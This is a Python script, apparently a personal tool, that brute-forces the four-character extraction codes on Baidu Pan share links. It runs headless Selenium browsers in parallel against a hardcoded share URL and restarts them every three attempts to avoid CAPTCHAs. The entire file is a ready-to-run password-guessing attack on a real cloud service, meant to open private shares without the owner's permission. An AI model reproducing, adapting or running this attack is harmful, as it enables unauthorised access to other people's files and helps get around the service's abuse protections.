#百度云提取码暴力破解程序
#Author:Halle Astra
#Time:20191006
#从0000-->002H 消耗20MB流量
#提取码集合数量：1679616，若3个耗费2.5s，则要1166.4/N个小时
import json
from selenium import webdriver
import requests
import time
from lxml import etree
import os 
from selenium.webdriver.common.touch_actions import TouchActions
from multiprocessing import Pool

dosleep = False
t0 = 0.4#暂停时间,0.2的误报率还是太高了		可以以迭代cs，而缩短 t0
N = 13#进程数,这是大概最快的，100个，0.2的暂停，大概要33.3s		   #关于N的选取，之后可以考虑用for循环，截取固定数量的cs，看跑的时间d   
#root = 'https://pan.baidu.com/s/16nVG7IdLg99HET3hSb5gGQ'
site = '//*[@id="mkco9Kb"]'
cksite = '//*[@id="grmvE3Vo"]/a/span/span'		

def getdriver(root):
	chrome_options = webdriver.ChromeOptions()
	chrome_options.add_argument("--headless")
	chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
	driver = webdriver.Chrome(chrome_options=chrome_options)
	driver.get(root)
	return driver

def subdriver(root,cs):
	res = []
	while len(cs)>1:
		count = 0
		driver = getdriver(root)#试过了，不quit，只是root的话，依然有验证码
		for c in cs:
			count += 1;#print(count,end = ',')
			if count%3==0:
				driver.quit()	  #不quit的话，每次getdriver都会有新的driver进程，然后爆内存
				driver = getdriver(root)		  #3次要一次验证码
			print(f'已尝试{count}个，正在尝试{c}')
			try:
				driver.find_element_by_xpath(site) .clear()
				driver.find_element_by_xpath(site).send_keys(c)
				driver.find_element_by_xpath(cksite).click()
			except:
				print(f'提取码为{c}')
				res.append(c)
				if cs[count-1] not in res:
					res.append(cs[count-1])
			if dosleep:
				time.sleep(t0)
			t = driver.page_source
			if '提取码错误' not in t:
				print(f'提取码为{c}')
				res.append(c) 
				#os.system('pause')
		try:driver.quit()
		except:pass
		cs = res
	return res

def search_begin(cs,count):
	tst = time.time()
	#root = input('请输入要破解的网盘链接：\n')		  
	root = 'https://pan.baidu.com/share/init?surl=qYS8ORM'
	pool = Pool(N)
	cs_use = []
	res = []
	if len(cs)>N:
		for i in range(N):
			for j in range(i,len(cs),N):
				cs_use.append(cs[j])
			res.append(pool.apply_async(subdriver,args = (root,cs_use)))
			cs_use = []
	else:
		cs_use = cs
		res.append(pool.apply_async(subdriver,args = (root,cs_use)))
	pool.close()
	pool.join()
	res = [i.get() for i in res]
	res_final = []
	for i in res:
		res_final = res_final+i
	for i in res_final:
		print(f'第{count}次搜索后,提取码候选项为：{i}')
	ted = time.time()
	t_use = ted-tst
	print(N,'\t',t_use)
	tinfo.append([N,t_use])
	return res_final

if __name__=='__main__':
	count = 0
	cs = []
	ws = list(range(10))+[chr(i) for i in range(65,65+26)]
	for i in ws:		   #对于某些满足特定条件的情况，可以从这里修改生成的cs
		for j in ws:
			for k in ws:
				for l in  ws:
					cs.append(f'{i}{j}{k}{l}')
	while len(cs)>1:
		count += 1
		cs = search_begin(cs,count)
	print(f'提取码最终结果为\t{cs}')
	os.system('pause')				
